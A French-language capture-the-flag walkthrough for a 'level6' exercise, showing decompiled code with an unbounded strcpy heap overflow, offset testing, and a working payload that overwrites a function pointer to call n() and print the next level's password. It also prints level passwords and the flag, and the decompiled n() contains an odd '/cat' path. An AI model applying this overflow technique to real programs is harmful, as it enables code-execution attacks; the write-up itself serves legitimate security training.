# Level6 - Walkthrough

## Objectif
Utiliser un buffer overflow sur le heap pour overwriter un pointeur de fonction et exécuter la fonction `n()` qui affiche le flag de level7.

---

## Étape 1 : Connexion

```bash
ssh level6@localhost -p 4242
# Mot de passe : d3b7bf1025544a6d95147b7b5b3f36f31f333db3
```

---

## Étape 2 : Reconnaissance

```bash
ls -la
./level6
# Segmentation fault (sans arguments)

./level6 test
# Nope
```

Le programme nécessite un argument.

---

## Étape 3 : Identifier la vulnérabilité

Analyser le binaire dans Ghidra :

```c
void main(undefined4 param_1, int param_2)
{
  char *__dest;
  undefined4 *puVar1;
  
  __dest = malloc(0x40);                    // Alloue 64 bytes
  puVar1 = malloc(4);                       // Alloue 4 bytes
  *puVar1 = m;                              // puVar1 pointe vers m()
  strcpy(__dest, *(char **)(param_2 + 4)); // BUFFER OVERFLOW !
  (*(code *)*puVar1)();                     // Exécute la fonction
  return;
}

void m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
{
  puts("Nope");
  return;
}

void n(void)
{
  system("/cat /home/user/level7/.pass");
  return;
}
```

**La vulnérabilité :** `strcpy()` sans limite + heap overflow.

**Stratégie :** Overwriter `puVar1` (qui contient l'adresse de `m()`) avec l'adresse de `n()`.

---

## Étape 4 : Trouver les adresses critiques

### Adresse de `n()`

```bash
objdump -t level6 | grep " n"
```

Ou dans Ghidra, hover sur `n()` :

```
n() @ 0x08048454
```

---

## Étape 5 : Trouver l'offset du heap overflow

Tester progressivement :

```bash
./level6 $(python -c 'print "A"*64 + "BBBB"')
# Segmentation fault

./level6 $(python -c 'print "A"*72 + "BBBB"')
# Segmentation fault

./level6 $(python -c 'print "A"*6 + "BBBB"')
# Nope (trop peu)

./level6 $(python -c 'print "A"*72 + "CCCC"')
# Segmentation fault (mauvaise adresse)
```

**L'offset est 72 bytes** (64 bytes de `__dest` + 8 bytes de padding du heap).

---

## Étape 6 : Construction du payload

Structure :
- `A` * 72 = Remplit `__dest` et le padding/metadata du heap
- `\x54\x84\x04\x08` = Adresse de `n()` en little-endian (écrase le pointeur dans `puVar1`)

Payload :
```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

---

## Étape 7 : Exploitation

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

Au lieu d'exécuter `m()` qui affiche "Nope", le programme exécute `n()` qui affiche le flag.

```bash
su level7
# Mot de passe : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## Flag
```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
